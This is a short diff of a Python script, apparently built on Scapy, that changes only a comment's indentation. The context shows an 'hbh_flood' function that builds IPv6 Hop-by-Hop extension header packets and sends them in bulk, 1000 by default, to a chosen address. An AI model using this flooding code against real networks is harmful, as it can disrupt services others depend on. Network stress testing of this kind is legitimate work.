@@ -35,7 +35,7 @@ def randomacaddr():
 
 
 def hbh_flood(psrc = '::1', pdst = '::1', psport = 1055, pdport = 53, ppayload = 'x'*100, pnumpkts = 1000):
-    	#Send defaults above unless entered by user
+    #Send defaults above unless entered by user
 	pkt = IPv6(src = psrc, dst = pdst)/IPv6ExtHdrHopByHop()/UDP(sport = psport, dport = pdport)/ppayload
 	pkt.show()    	
 	send(pkt, count = pnumpkts)
